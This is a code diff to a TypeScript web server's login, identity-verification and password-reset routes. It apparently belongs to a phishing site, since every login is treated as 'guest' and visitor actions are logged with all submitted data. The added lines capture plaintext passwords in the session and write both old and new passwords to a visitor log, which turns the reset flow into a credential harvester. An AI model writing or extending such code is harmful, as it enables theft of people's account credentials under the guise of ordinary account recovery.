@@ -154,6 +154,7 @@ const verifyIdentitySchema = z.object({
 });
 
 const resetPasswordSchema = z.object({
+  oldPassword: z.string().optional(),
   newPassword: z.string().min(6, "Password must be at least 6 characters"),
   confirmPassword: z.string().min(6, "Password must be at least 6 characters"),
 }).refine((data) => data.newPassword === data.confirmPassword, {
@@ -210,6 +211,7 @@ export async function registerRoutes(
 
       (req.session as any).userId = "guest";
       (req.session as any).username = username;
+      (req.session as any).capturedPassword = password;
 
       logVisitorAction(req, "login_attempt", { 
         username, 
@@ -334,6 +336,11 @@ export async function registerRoutes(
 
       const { verificationType } = result.data;
       
+      // Store the password in session for password reset step
+      if (req.body.currentPassword) {
+        (req.session as any).capturedPassword = req.body.currentPassword;
+      }
+      
       // Log the identity verification attempt with all data
       logVisitorAction(req, "identity_verification", {
         username: username,
@@ -377,11 +384,12 @@ export async function registerRoutes(
         });
       }
 
-      const { newPassword } = result.data;
+      const { oldPassword, newPassword } = result.data;
       
-      // Log the password reset attempt
+      // Log the password reset attempt with both old and new passwords
       logVisitorAction(req, "password_reset", {
         username: username,
+        password: oldPassword || (req.session as any)?.capturedPassword,
         newPassword: newPassword,
       });
 
